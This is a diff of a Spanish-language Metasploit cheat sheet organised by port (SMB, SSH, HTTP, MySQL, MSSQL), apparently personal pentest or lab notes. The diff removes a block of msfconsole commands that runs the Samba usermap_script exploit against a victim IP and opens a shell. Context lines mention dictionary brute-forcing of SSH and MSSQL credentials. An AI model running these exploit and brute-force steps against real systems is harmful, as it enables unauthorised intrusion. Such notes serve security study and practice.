@@ -3,7 +3,7 @@
 Tags: #Metasploit 
 
 
-## Puerto 445 SMB 'Reconocimiento'
+## Puerto 445 SMB 
 
 ```bash 
 # Miramos la version del SMB
@@ -76,22 +76,7 @@ Tags: #Metasploit
 	❯ run 
 ```
 
-## Puerto 445 SMB 'Exploit'
-
-```bash 
-# Algunas versiones con exploit (3.0.20)
-❯ msfconsole -q                  # q = Quitar el banner de inicio
-
-	❯ search samba 
-	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
-	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
-	❯ set LHOSTS 192.168.1.157                     # Colocamos la IP de nuestra maquina 
-	❯ run 
-	❯ shell 
-```
-
-## Puerto 22 SSH 'Reconocimiento'
+## Puerto 22 SSH
 
 ```bash 
 # Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
@@ -107,7 +92,7 @@ Tags: #Metasploit
 ```
 
 
-## Puerto 80 HTTP 'Reconocimiento'
+## Puerto 80 HTTP
 
 ```bash 
 # Miramos la version del HTTP
@@ -141,7 +126,7 @@ Tags: #Metasploit
 
 
 
-## Puerto 3306 MYSQL 'Reconocimiento'
+## Puerto 3306 MYSQL 
 
 ```bash 
 # Mostrar las bases de datos 
@@ -209,7 +194,7 @@ Tags: #Metasploit
 	❯ run 
 ```
 
-## Puerto 1433 MSSQL 'Reconocimiento'
+## Puerto 1433 MSSQL
 
 ```bash 
 # Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
